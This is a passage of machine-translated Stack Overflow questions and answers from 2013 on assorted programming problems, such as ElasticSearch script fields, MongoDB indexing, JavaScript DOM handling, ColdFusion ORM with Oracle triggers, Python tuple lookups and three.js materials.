我是 ElasticSearch 的新手，想知道，一旦您使用 mvel 语法定义了一个脚本字段，您是否可以随后过滤或在查询正文中引用它，就好像它是任何其他字段一样？

我找不到任何这样的例子，同时我没有在文档页面上看到任何关于这是否可能的提及

[http://www.elasticsearch.org/guide/reference/modules/scripting/](http://www.elasticsearch.org/guide/reference/modules/scripting/) [http://www.elasticsearch.org/guide/reference/api/search/script-fields/](http://www.elasticsearch.org/guide/reference/api/search/script-fields/)

这本书 ElasticSearch Server 也没有提到这是否可能

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2018-05-08T05:35:34.893

至于 2018 和 Elastic 6.2，仍然无法按定义的字段进行过滤，但是，您可以为相同的目的`script_fields`定义自定义[脚本过滤器。](https://www.elastic.co/guide/en/elasticsearch/reference/6.2/query-dsl-script-query.html)例如，假设您已经定义了以下脚本字段：

```
{
  "script_fields" : {
    "some_date_fld_year":"doc["some_date_fld"].empty ? null : doc["some_date_fld"].date.year"
  }
} 
```

你可以用它过滤

```
{
  "query": {
    "bool" : {
      "must" : {
        "script" : {
          "script" : {
            "source": " (doc["some_date_fld"].empty ? null : doc["some_date_fld"].date.year) >= 2017",
            "lang": "painless"
          }
        }
      }
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-27T01:25:14.207

这是不可能的，原因很简单：script_fields 是在搜索的最后阶段（获取阶段）计算的，并且仅针对您检索的记录（默认为前 10 名）。脚本过滤器适用于未被前面过滤器过滤掉的所有记录，并且它发生在查询阶段，该阶段在获取阶段之前。换句话说，当应用过滤器时，script_fields 还不存在。

# mongodb - 使用 Mongo：我们应该为每种类型的大容量查询创建一个定制的索引吗？

> ID：15650129
> 
> 赞同：0
> 
> 时间：2013-03-27T00:49:07.383
> 
> 标签：mongodb, indexing, mongomapper

我们有两种类型的大容量查询。查找涉及 5 个属性的文档：日期 (lte)、存储在数组中的值、存储在第二个数组中的值、一个整数 (gte) 和一个浮点数 (gte)。

第二个包括这五个属性加上另外两个。

我们是否应该创建两个复合索引，每个查询一个？假设每个属性都具有高基数。

如果我们这样做，因为每个查询都涉及多个数组，由于 Mongo 的限制，我们似乎无法创建索引。在这种情况下，人们如何构建他们的 Mongo 数据库？

我们正在使用 MongoMapper。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:06:48.193

查询中的第一个范围之后的查询索引附加索引字段的值显着下降。

从概念上讲，我发现最好考虑索引中的附加字段，以便从查询中修剪更小的子树。第一个范围切断了一个大分支，第二个更小，第三个更小，依此类推。我的一般经验法则是索引中查询的第一个范围是有价值的。

该规则需要注意的是，索引中的其他字段可用于帮助对返回的结果进行排序。

对于第一个查询，我将在两个数组值上创建一个索引，然后哪个范围将排除最多的文档。除非您可以关闭范围（lte 和 gte），否则日期字段不太可能提供高度排除。整数和浮点数在不知道域的情况下很难分辨。

如果第二个查询的两个附加属性也在查询中使用范围并且没有明显更高的排除值，那么我将只使用一个索引。

抢。

# javascript - 如何从字符串中删除一个字符，并从新字符串中返回一个数字 - Javascript

> ID：15650130
> 
> 赞同：0
> 
> 时间：2013-03-27T00:49:14.530
> 
> 标签：javascript, string, binary, return

我有一些函数旨在将用户输入作为字符串转换为二进制数。这是我正在研究的基本“汇编程序”程序的一部分。这是我的代码：

```
 function generateBinaryNumber(inputValue) //only works for hash!
{
    var number;

    if(containsHash(inputValue) != -1)
    {
        number = getNumberFromString(inputValue);
    }

    return decimalToBinary(number);
}

function containsHash(number) //Working!
{
    var n = number.indexOf('#');
    return n;
}

function getNumberFromString(mixedInput) //Working!
{
    return (mixedInput.replace('#',''));
}

function decimalToBinary(decimal) //Working!
{
    decimal = parseInt(decimal);
    return decimal.toString(2);
} 
```

例如，如果用户输入值“5”，该函数将返回 NaN - 但是如果他们指定 #5 它可以工作 - 返回 101。我是编程和 Javascript 的新手，如果有人能指出我正确的方向，那就太好了。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:06:04.487

如果没有，你就没有通过输入`#`

```
function generateBinaryNumber(inputValue) //only works for hash!
{
    var number; //number is not set

    if(containsHash(inputValue) != -1) 
    {
        //number is set here, but only if the if statement is true
        number = getNumberFromString(inputValue);
    }
    //if containsHash was false, number is undefined
    return decimalToBinary(number);
} 
```

你只想说`var number=inputValue;`当你宣布它

作为旁注，您还应该在 parseInt 中添加一个 radix 参数（类似于`parseInt(decimal,10)`），否则它会将输入`"010"`视为十六进制数字并错误地解析它。

# javascript - 创建一个可以自行删除的元素？

> ID：15650131
> 
> 赞同：11
> 
> 时间：2013-03-27T00:49:16.853
> 
> 标签：javascript, onclick, lightbox, removechild

我正在构建一个灯箱作为学校项目，但我不能使用 jQuery。我有一个图像。当你点击它时，Javascript 会创建一个 ID 为“overlay”的透明 div。我希望 div 自行删除，或者父级删除它，但它不起作用。我认为这与您无法将“onclick”链接到尚不存在的元素这一事实有关。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-03-27T01:09:37.093

您必须从父元素中删除元素。像这样的东西：

```
d = document.getElementById('overlay');
d.parentNode.removeChild(d); 
```

或者你可以隐藏它：

```
d.style.display = 'none'; 
```

而且，哦：您可以通过将函数分配给 onclick 属性来将 Javascript 代码添加到（新创建的）元素。

```
d = document.createElement('div');
d.onclick = function(e) { this.parentNode.removeChild(this) }; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2018-07-09T07:15:30.153

您可以像下面这样删除元素

```
var el = document.getElementById('div-02');
el.remove(); // Removes the div with the 'div-02' id 
```

[点击这里](https://developer.mozilla.org/en-US/docs/Web/API/ChildNode/remove)了解更多详情

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T00:53:52.970

不要`onclick`在标签中使用处理程序，使用 Javascripts 事件函数，例如[`addEventListener`](https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener)将事件动态添加到元素中。您还应该确保在删除元素时正确清除所有引用（换句话说，取消注册事件处理程序）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T11:07:31.130

我明白了 :) 我像巴特一样伤心，但它没有用。我的代码看起来像这样：

```
image.onclick = function(){ *create overlay*};
overlay.oncklick = function() {*overlay.parentNode.removeChild(overlay)*}; 
```

浏览器就像wtf？导致它读取代码并认为“我无法检查用户是否单击了不存在的元素。” 所以我这样做了：

```
image.onclick = function(){

*create overlay*

overlay.onclick = function() {*remove overlay*};
}; 
```

# asp.net - ScriptResource.axd 404 错误仅在子域上

> ID：15650132
> 
> 赞同：0
> 
> 时间：2013-03-27T00:49:19.393
> 
> 标签：asp.net, subdomain, ajaxcontroltoolkit

我已经使用 AJAX 设置了我的网站（ASP.NET 4.0），运行完全没有问题。

当我在本地和主要顶级域上测试我的网站时，没有问题。

当我在子域页面上时，AJAX 客户端框架无法加载。我深入观察了这个问题，发现每当我在子域页面上时，WebResource.axd 会加载但 ScriptResource.axd 不会加载（返回 404 Not Found 错误）。我想我应该修改 web.config 文件中的一些条目，但我不知道该怎么做？

如果您想现场查看问题，请访问 www.123tiendas.com/subdominios/articulo/default.aspx?id=2020 没有问题。访问 www.articulo.123tiendas.com/?id=2020，您会发现问题所在。（使用任何 Web 开发人员工具查看返回的内容）

`GET http://articulo.123tiendas.com/ScriptResource.axd?d=BHVdt7ZKRNgWkcmIzZPX-cQ…NHSxpLPXcqbJyg46pdNsVlEnaL_JpR-IQ0IdhPXwT575CanbqzCN8vtDLDFF9A2&t=48e38e19 404 (Not Found) articulo.123tiendas.com:119`

# php - .htaccess display_startup_errors 设置取决于 php 脚本配置文件

> ID：15650136
> 
> 赞同：2
> 
> 时间：2013-03-27T00:50:04.850
> 
> 标签：php, .htaccess, error-handling

我正在创建自己的框架作为学习过程。有一个配置文件，人们可以在其中设置框架是否处于开发模式。

```
<?PHP
$project[security][dev_mode] = true;
?> 
```

Display_startup_errors 在 .htaccess 中定义，以指示是否应显示语法错误。如果用户不需要弄乱 .htaccess 文件，我希望它可以“调整”到配置文件中的设置。任何人都知道*是否*以及*如何*以某种方式让 .htaccess 检查 php 文件的内容并采取相应措施？

也欢迎以 .htaccess 以外的其他方式设置 display_startup_errors 的解决方案；-)。

提前谢谢了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T00:58:20.873

尝试

```
<?php
$iDevMode = ( $project['security']['dev_mode'] ) ? 1 : 0;

ini_set('display_errors', $iDevMode);
?> 
```

根据定义进行切换。这是一个丑陋的三元运算（您可以将其转换为**if**语句进行练习），并且需要在程序的早期处理。

另请注意，PHP 会抛出一个通知，因为我没有将关联数组引用封装在引号中，就像我在上面所说的那样。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:07:34.790

使用 .htaccess 处理错误的另一种方法是创建一个可配置的 php 文件，该文件可以像其他框架一样在开发、生产和测试阶段进行设置。

```
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 */
    define('ENVIRONMENT', 'development');
/*
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */

if (defined('ENVIRONMENT'))
{
    switch (ENVIRONMENT)
    {
        case 'development':
            error_reporting(E_ALL);
        break;

        case 'testing':
        case 'production':
            error_reporting(0);
        break;

        default:
            exit('The application environment is not set correctly.');
    }
} 
```

或者手动尝试使用 ini_set() 将错误处理的配置正确设置为 on

```
// change settings for error handler to show errors
// $this setup is used for checking errors for development to be shown.... 
ini_set('display_errors', 1);
ini_set('display_startup_errors',1);
error_reporting(E_ALL); 
```

# ios - 具有“位置”背景模式的 iOS 长时间运行的后台计时器

> ID：15650139
> 
> 赞同：2
> 
> 时间：2013-03-27T00:50:14.620
> 
> 标签：ios, background

我想实现长时间运行的后台计时器，它定期将用户的位置发送到服务器。

为此，我设置`location`了模式`UIBackgroundModes`，并`beginBackgroundTaskWithExpirationHandler`在应用程序进入后台时调用。而对于`CLLocationManager`，我使用`startUpdatingLocation`方法（不想使用重大变化，因为我需要高精度定位）。

但是在应用程序进入后台大约 26 分钟后，它停止向服务器发送位置。但是应用程序没有崩溃，所以在我把应用程序带到前台后，它可以恢复它的计时器。

26 分钟来自实验，使用 iOS 6.1、iPhone 5。

这里有几个问题，

1.  我不明白为什么它在 26 分钟而不是 10 分钟后暂停，这被称为后台任务的时间限制。

2.  在 16 分钟之前，`backgroundTimeRemaining`方法返回双倍最大值。但在 16 分钟后，它会从 减少`600`，因此它会在 10 分钟后暂停后台任务。

我已经尝试`beginBackgroundTaskWithExpirationHandler`在到期处理程序内部调用，但没有用。

如果有人对这个问题有线索，将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-12-20T06:13:25.080

[https://github.com/voyage11/Location](https://github.com/voyage11/Location)

使用此代码。您可以设置要调用它的时间间隔。我尝试了很多代码，但我发现这是最准确且电池电量最少的问题。这对于后台定位服务也很棒。:)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-12-20T03:14:55.690

如果设置`UIBackgroundModes`成功，App可以在你移动的时候在后台长时间运行。但是，如果您停止移动超过 10 分钟（可能更久），应用程序将被系统暂停。如果位置更新，你的 App 会被唤醒，但是这个唤醒时间会很短，所以你必须调用 `beginBackgroundTaskWithExpirationHandler`方法来处理位置更新。

# orm - Coldfusion ORM 复合键未更新

> ID：15650141
> 
> 赞同：0
> 
> 时间：2013-03-27T00:50:30.543
> 
> 标签：orm, coldfusion, coldfusion-9

我有一个正在使用的旧数据库，并且只能进行有限的更改。这是我有一个包含复合键列reportnum 和suffix 的表的问题。我已经对其进行了设置，以便触发器和序列可以正确设置值。因此，当我使用 model.new() 然后 model.save() 插入一个新值时，该值会正确保存到数据库中，但问题是当我查看模型中的值时，reportnum 和 suffix 是空字符串。

我尝试创建一个新的主键并将旧键转换为索引，但这会破坏与其他模型的关系。

寻找有关如何处理此问题的建议。谢谢。这是我如何制作触发器的链接。 [Oracle PL/SQL 触发器错误](https://stackoverflow.com/questions/15647188/oracle-pl-sql-trigger-error)

ORM 模型：

```
component entityName="report" persistent="true" extends="coldbox.system.orm.hibernate.ActiveEntity" table="REPORTS" schema="myschema" {
    property name="reportnum" fieldtype="id" ; 
    property name="suffix" fieldtype="id" ; 
    property name="status"; 

    //Plus other properties...

    property name="parcels" 
        fieldtype="one-to-many" 
        type="array" 
        cfc="parcel" 
        singularname="parcel" 
        fkcolumn="reportnum,suffix" 
        column="reportnum,suffix"
            cascade="save-update";
}

component entityName="parcel" persistent="true" extends="coldbox.system.orm.hibernate.ActiveEntity" table="PARCELS" schema="myschema" {
    property name="parcel_id" column="parcelid" fieldtype="id" generator="sequence" sequence="myschema.seq1_parcels";
    property name="parcelnum";
    property name="reportnum";
    property name="suffix";
    //Plus other properties...
} 
```

表：

```
CREATE TABLE reports(
    REPORTNUM      NUMBER(11),
    SUFFIX         NUMBER(11),
    STATUS         VARCHAR2(8),
;

ALTER TABLE REPORTS ADD ( CONSTRAINT PK_REPORTS PRIMARY KEY (REPORTNUM, SUFFIX));

CREATE SEQUENCE SEQ1_REPORTS MAXVALUE 1E28 START WITH 1;

CREATE OR REPLACE TRIGGER "TRG1_REPORTs" BEFORE INSERT ON
myschema.REPORTS FOR EACH ROW
BEGIN
    IF coalesce( :NEW.reportnum, -1 ) = -1 THEN
        SELECT myschema.seq1_REPORTs.NEXTVAL INTO :NEW.reportnum FROM dual;
        :NEW.SUFFIX := 0;
    elsif coalesce(:NEW.suffix,-1) = -1 then
        --If only a report number is given make the suffix 1 larger then the max found.
        SELECT MAX(suffix)+1
        INTO :NEW.suffix FROM myschema.REPORTS WHERE reportnum = :NEW.reportnum;
    END IF;
END;

/

CREATE OR REPLACE TRIGGER "TRG2_REPORTs" BEFORE update ON
myschema.REPORTS FOR EACH ROW
BEGIN
    IF coalesce( :OLD.REPORTid, -1 ) = -1 THEN
        SELECT myschema.seq2_REPORTs.NEXTVAL INTO :NEW.REPORTid FROM dual;
    END IF;
END;

/

CREATE OR REPLACE TRIGGER TRG1_REPORTs" BEFORE INSERT ON
myschema.REPORTS FOR EACH ROW
BEGIN
    IF coalesce( :NEW.reportnum, -1 ) = -1 THEN
        SELECT myschema.seq2_REPORTs.NEXTVAL INTO :NEW.reportnum FROM dual;
        :NEW.SUFFIX := 0;
    elsif coalesce(:NEW.suffix,-1) = -1 then
        --If only a report number is given make the suffix 1 larger then the max found.
        SELECT MAX(suffix)+1
        INTO :NEW.suffix FROM myschema.REPORTS WHERE reportnum = :NEW.reportnum;
    END IF;
END;

/

CREATE TABLE PARCELS (
    PARCELID       NUMBER(11) NOT NULL,
    PARCELNUM      NUMBER(11),
    REPORTNUM      NUMBER(11) DEFAULT 0,
    SUFFIX         NUMBER(11) DEFAULT 0,
    --Plus other properties...
;

ALTER TABLE PARCELS ADD ( CONSTRAINT PK_PARCELS PRIMARY KEY (PARCELID));

CREATE OR REPLACE TRIGGER "trg1_parcels" BEFORE INSERT ON
myschema.parcels FOR EACH ROW
BEGIN
    IF coalesce( :NEW.parcelid, -1 ) = -1  THEN
        SELECT myschema.seq1_parcels.NEXTVAL INTO :NEW.parcelid FROM DUAL;  
    END IF;
END;

/ 
```

Oracle 11 和 Coldfusion 9 的当前版本。

# javascript - 我无法在 Chrome 中运行以下 ajax 调用？

> ID：15650143
> 
> 赞同：-1
> 
> 时间：2013-03-27T00:50:40.040
> 
> 标签：javascript, jquery, ajax

以下代码在 Chrome 中不起作用，我想确保它在所有浏览器中都起作用：

```
$.ajax({
    url: 'homepage_marquee/marquee_panels.html',
    context: document.body,
    async: false,
    success: function (data) {
        $('.marquee_panel_data').html(data);
        setUpMarquee();
    }
}); 
```

ajax 应该循环浏览`marquee_panels.html`文件中的一些启动画面。它只显示 Chrome 上的第一个面板。我没有收到任何错误。在 IE9 和 Safari 中运行良好。

我尝试过本地文件访问并通过 Apache 托管。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:58:17.327

尝试在 url 中添加前导斜杠。

```
url: '/homepage_marquee/marquee_panels.html', 
```

这是一个正确的相对路径。

# c - 在树莓派上构建 R

> ID：15650144
> 
> 赞同：1
> 
> 时间：2013-03-27T00:50:51.860
> 
> 标签：c, r, arm, c99, raspberry-pi

我正在使用为 Raspberry Pi 定制的工具链构建一个软件包。

我遇到了一个 C 标准问题。编译时，我收到一条错误消息，提示 C99 需要 SIZE_MAX。

看这里：

```
make[2]: Leaving directory `/home/njackson/R-2.15.3/src/unix'
make[2]: Entering directory `/home/njackson/R-2.15.3/src/unix'
make[3]: Entering directory `/home/njackson/R-2.15.3/src/unix'
making dynload.d from dynload.c
In file included from dynload.c:33:0:
../../src/include/Defn.h:209:3: error: #error SIZE_MAX is required for C99
make[3]: *** [dynload.d] Error 1
make[3]: Leaving directory `/home/njackson/R-2.15.3/src/unix'
make[2]: *** [R] Error 2
make[2]: Leaving directory `/home/njackson/R-2.15.3/src/unix'
make[1]: *** [R] Error 1
make[1]: Leaving directory `/home/njackson/R-2.15.3/src'
make: *** [R] Error 1 
```

# java - 通过for循环设置二叉树节点的左属性

> ID：15650145
> 
> 赞同：0
> 
> 时间：2013-03-27T00:51:02.233
> 
> 标签：java, binary-tree

我有一个二叉树，通过链接节点实现（具有：int 元素，BinaryNode 左，BinaryNode 右，BinaryNode 父属性）。我想将根节点的第 n 个节点设置为 xie 如果 n = 3，那么我想做 root.left.left.left = x。

最初，我正在考虑设置一个临时 BinaryNode 变量并执行以下操作：

```
BinaryNode temp = root;
BinaryNode x = new BinaryNode(10, null, null, null);

for (int i = 0; i < n; i++){
    temp = temp.left;
} 
```

然后，一旦我走到最后，我想说，temp.left = x，但后来我意识到/认为这样做不会对实际的树做任何事情，因为 temp 只是根的副本？

那么我将如何尝试做到这一点？:<

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:05:19.793

我认为这应该有效

```
private void replace(BinaryNode node, int n, int x) {
    if (n==0) {
        node.x = x
        return;
    }
    if (node.left != null)
        replace(node.left, n-1, x);
} 
```

`replace(root, 3, 10)`并用例如调用它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:25:35.657

在您的示例中，`temp`不是根的副本。它是对根的*引用。*因此，您的代码实际上会修改原始树。但是，您还有另一个问题——如果树中没有那么多节点怎么办？换句话说，如果 n 为 5 并且节点`.left`链中只有三个节点，那么您最终将得到 a `NullPointerException`。当你沿着链条走下去时，你需要检查 null 。

# android - Android如何将图像背景调整为居中

> ID：15650150
> 
> 赞同：0
> 
> 时间：2013-03-27T00:52:03.680
> 
> 标签：android

我在属性中`ToggleButton`设置了图像。`android:background`此背景图像适合所有背景。

我想在一个大的 ToggleButton 中居中一个较小的背景图像，避免放大图像以适应所有背景。

有人有线索吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-10T18:33:29.523

好，我知道了：

首先，我们在 XML 布局中创建 ToggleButton。认为我们的 drawable 是一个选择器，其中包含两个小于背景的（用于选定和未选定状态的）图像`ToggleButton`：

```
<ToggleButton
     android:id="@+id/messageSeeMoreToggleButton"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"
     android:textOff=""
     android:textOn=""
     android:background="@drawable/selector_wall_toggle_see_more_button"
     android:contentDescription="@string/conversation_see_more_Button_description" /> 
```

然后，在我们的课堂`Activity`上，我们`ToggleButton`照常找到：

```
viewHolder.messageSeeMoreToggleButton = (ToggleButton) view.findViewById(R.id.messageSeeMoreToggleButton); 
```

现在，我们将改变可绘制对象的外观，使用`StateListDrawable.setLevel`. 我们可以调整值以`setLevel`获得更好的结果：

```
StateListDrawable stateListDrawable = (StateListDrawable) viewHolder.messageSeeMoreToggleButton.getBackground();
stateListDrawable.setLevel(3000); 
```

因此，我们将图像居中放置在`ToggleButton`背景中，避免放大图像。

我希望它可以帮助某人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:01:28.337

如果您想在图像上放置文本，您可能必须在代码中而不是 XML 中设置图像。就像是：

```
Resources r = getResources();
Drawable myimage = r.getDrawable(R.drawable.myimage);
Button mybutton = findViewById(R.id.mybutton);
myimage.setBounds(0, 0, myimage.getIntrinsicWidth(), myimage.getIntrinsicHeight());
mybutton.setCompoundDrawables(myimage, null, null, null); 
```

# objective-c - 通过 NSTask 启动 X11 应用程序的问题

> ID：15650151
> 
> 赞同：0
> 
> 时间：2013-03-27T00:52:09.473
> 
> 标签：objective-c, macos, unix, pygtk

我的应用程序使用 NSTask 执行 shell 脚本，其中一个脚本启动 X11 应用程序（特别是`meld`）。

我原以为这会起作用：

```
#!/bin/bash
source ~/.profile                      # setup $PATH/etc
meld . 
```

但它失败了：

```
gtk.icon_theme_get_default().append_search_path(meld.paths.icon_dir())
Traceback (most recent call last):
  File "/usr/local/bin/meld", line 132, in <module>
    gtk.icon_theme_get_default().append_search_path(meld.paths.icon_dir())
AttributeError: 'NoneType' object has no attribute 'append_search_path' 
```

作为概念证明，我将脚本更改为此，效果很好：

```
#!/usr/bin/ruby

exec 'osascript -e \'tell app "Terminal" to do script "meld ' + Dir.pwd + '" in front window\'' 
```

有谁是造成问题的原因？这是我执行shell脚本的代码：

```
NSTask *task = [[NSTask alloc] init];
task.launchPath = self.scriptURL.path;
task.standardOutput = [NSPipe pipe];
task.currentDirectoryPath = workingDirectoryURL.path;

[task launch]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T06:36:32.997

X11 应用程序使用 DISPLAY 环境变量学习显示服务器的地址。

在 OS X 上，出于安全原因，DISPLAY 值是随机的，因此您无法对其进行硬编码，正如您所注意到的。相反，有一个 launchd 代理告诉 launchd 在启动进程时设置 DISPLAY。

在launchd 和meld 之间的某个地方，DISPLAY 的值正在被删除或覆盖。你的工作是找出在哪里。

1.  确保已启动的代理正在运行。运行`launchctl list`并查找 org.macosforge.xquartz.startx。由于`meld`是从 Terminal.app 工作的，这部分可能是正确的。
2.  确保在您的应用中设置了 DISPLAY。它应该列在`[NSProcessInfo processInfo].environment`.
3.  确保在您启动的 NSTask 中设置了 DISPLAY。尝试`/usr/bin/env`使用 NSTask 运行，并确保 DISPLAY 出现在其输出中。
4.  确保在您运行的脚本中设置了 DISPLAY。`echo $DISPLAY`在采购〜/ .profile之前和之后尝试。（有时 .profile 本身会将 DISPLAY 覆盖为不正确的值，因为有时在其他操作系统上这样做是正确的。）

**编辑：**这是我用来将 DISPLAY 从我的 GUI 应用程序复制到 shell 脚本的代码：

```
NSTask *task = ...
task.environment = [NSProcessInfo processInfo].environment;
[task.launch]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T03:12:49.347

更改您的脚本以喷出环境变量并将“工作”与“不工作”进行比较。

在不同的执行模型中，shell 的初始化方式存在细微差别。几乎可以肯定，环境是问题的根源。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T06:18:38.490

看看 man launchctl

launchctl 提交 ... -p /usr/local/bin/meld -- 。

已启动启动工作；这将为您设置某些环境变量，这些变量是每用户会话的一部分。

# c# - 获取/设置在代码隐藏中创建的输入控件值

> ID：15650152
> 
> 赞同：0
> 
> 时间：2013-03-27T00:52:14.963
> 
> 标签：c#, asp.net, input, user-controls, controls

我有许多在代码隐藏中创建的输入（文本框）控件，作为动态 RadiobuttonList 控件的一部分（以便文本框位于单选按钮旁边）：

```
 RadioButtonList radioOption = new RadioButtonList();

 radiobuttonlist.Items.Add(new ListItem(dt1.Rows[i][9].ToString() + " <input id=\"" + name + "\" runat=\"server\" type=\"text\" value=\"Enter text\" />") 
```

我的问题是，如何访问输入文本以设置或获取它的值？

作为循环的一部分，总共创建了大约 10 个不同的输入控件。

任何想法将不胜感激！！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:06:16.707

我要做的是使用 FindControl 方法。根据您的 id 是什么，您可以遍历它们并找到控件 - 然后将其转换为特定的控件。

```
TextBox textBox = (TextBox)Page.FindControl(id); 
```

然后你可以设置并开始它：

```
textBox.text = "text";
string text = textBox.text; 
```

编辑：您可能还需要将 runat="server" 标记添加到动态创建的文本框中，以便从服务器端访问它。

# python - 比较列表项和元组

> ID：15650155
> 
> 赞同：0
> 
> 时间：2013-03-27T00:52:20.240
> 
> 标签：python, list, python-3.x, tuples

在 Python 3 中，我正在尝试创建一个程序，该程序将用户输入作为 3 位代码并将它们转换为列表中的项目。然后它将这些项目与元组列表中元组的第一个（3 位代码）部分进行比较并打印**整个**元组。

```
import shares
portfolio_str=input("Please list portfolio: ")
portfolio_str= portfolio_str.replace(' ','')
portfolio_str= portfolio_str.upper()
portfolio_list= portfolio_str.split(',')
print(portfolio_list)
print()
print('{:<6} {:<20} {:>8}'.format('Code', 'Name', 'Price'))
data=shares.EXCHANGE_DATA
for  (code, name, share_value) in data:
      if code == i in portfolio_list:
        print('{:<6} {:<20} {:>8.2f}'.format(code, name, share_value))
else:
        print("Failure") 
```

如您所见，我正在使用一个名为 share 的模块，其中包含一个名为 EXCHANGE_DATA 的元组列表，其设置如下：

```
EXCHANGE_DATA = [('AIA', 'Auckair', 1.50),
         ('AIR', 'Airnz', 5.60),
         ('AMP', 'Amp',3.22), 
         ('ANZ', 'Anzbankgrp', 26.25),
         ('ARG', 'Argosy', 12.22),
         ('CEN', 'Contact', 11.22),
         ('CNU', 'Chorus',3.01),
         ('DIL', 'Diligent', 5.3),
         ('DNZ', 'Dnz Property', 2.33),
         ('EBO', 'Ebos', 1.1), 
```

一个示例输入是： `AIA, AMP, ANZ`

相应的输出将是：

```
Code         Name         Price
AIA          Auckair      1.50
AMP          Amp          3.22
ANZ          Anzbankgrp   26.25 
```

我只是坚持我认为我需要的 for 和/或 if 语句。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:07:13.490

你的问题在这里：

```
if code == i in portfolio_list: 
```

这在 Python 中没有意义。`in`检查列表中是否包含给定值，因此检查是否`i`在中`portfolio_list`，然后检查是否`code`等于`True`或`False`（无论`i in portfolio_list`返回什么。您想要的只是：

```
if code in portfolio_list: 
```

请注意，如果`portfolio_list`可能很长，则将其设为一个集合可能是值得的，因为对于大量数据，检查集合中的成员身份要有效得多。

您的语法似乎是不同方法的混搭。你的意思可能是：

```
if any(code == i for i in portfolio_list): 
```

但是，由于这直接等效于`code in portfolio_list`，但更冗长且效率低下，因此不是一个好的解决方案。

# html - 如何使用 CSS 渲染像第一张图片一样的表格？

> ID：15650159
> 
> 赞同：-1
> 
> 时间：2013-03-27T00:52:31.457
> 
> 标签：html, css, css-tables

![在此处输入图像描述](../Images/78ca678718db5280cc90f3851286b00a.png)

我想 CSS 一个表格，但我无法呈现“tr”之间的线：

![在此处输入图像描述](../Images/744cdb2ee9c05cfb5d99a75aeb949d8d.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:04:18.367

试试这个

```
table {
    border-left:1px solid #000;
    border-bottom:1px solid #000;
}
td {
    border-top:1px solid #000;
    border-right:1px solid #000;
    width:50px;
    padding:0 0 0 10px;
} 
```

工作[演示](http://jsfiddle.net/jhunlio/MsYdJ/19/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T00:54:26.827

添加这个CSS：

```
td {
    border:1px solid #000;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T00:55:23.483

只需将属性添加`rules="all"`到您的`<table>`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T01:49:35.197

将 CSS 放在 tr 元素上并不总是很好。

如果你只想要行边框，你可以尝试这样的事情：

```
td {
border-bottom:1px solid #000;
} 
```

# javascript - 自定义terrain.js(three.js) 需要添加lambert/wire材质

> ID：15650169
> 
> 赞同：0
> 
> 时间：2013-03-27T00:54:10.333
> 
> 标签：javascript, three.js, terrain, fractals

我最近开始使用three.js，并且我正在使用[terrain.js](https://github.com/daogan/terrain-generator)演示作为我正在从事的设计项目的开始。

我想添加一个混合着色器“线框/兰伯特”，默认情况下仅带有线着色器。

这是演示中的代码，使用基本材料：

```
 var matrix = new THREE.MeshBasicMaterial({
            color:0x10ce58, 
            wireframe:true
        });

        var geometry = new THREE.PlaneGeometry(width, height, modelWidth, modelHeight); 
        mesh = new THREE.Mesh(geometry, matrix); 
        mesh.doubleSided = false; 
```

我尝试过这样的事情，但我只得到“兰伯特”渲染，而不是兰伯特和电线的组合，有什么想法吗？

```
 var darkMaterial = new THREE.MeshLambertMaterial( { color: 0xffffff , shading: THREE.FlatShading, overdraw: true} );
    var wireframeMaterial = new THREE.MeshBasicMaterial( { color: 0x10ce58, wireframe: true, transparent: true } ); 
    var multiMaterial = [ darkMaterial, wireframeMaterial ]; 

        var geometry = new THREE.PlaneGeometry(width, height, modelWidth, modelHeight); 
        mesh = new THREE.Mesh(geometry, multiMaterial); 
        mesh.doubleSided = false; 
```

感谢您的时间提前，

问候

-曼努埃尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T23:02:07.943

这是我在材料的非工作示例中使用的代码（[http://jsfiddle.net/xnqUb/3/](http://jsfiddle.net/xnqUb/3/)）

```
var geometry = new THREE.PlaneGeometry(width, height, model.length - 1, model.length - 1, materials);
       materials = [
                     new THREE.MeshLambertMaterial( { color: 0xffffff, shading: THREE.FlatShading, overdraw: true } ),
                     new THREE.MeshLambertMaterial({ color: 0x10ce58, wireframe: true,})
                ];

  var mesh = new THREE.Mesh(geometry); 

  object = THREE.SceneUtils.createMultiMaterialObject(geometry, materials); 
```

# java - org.codehaus.jackson.map.JsonMappingException 使用 ObjectMapper

> ID：15650173
> 
> 赞同：2
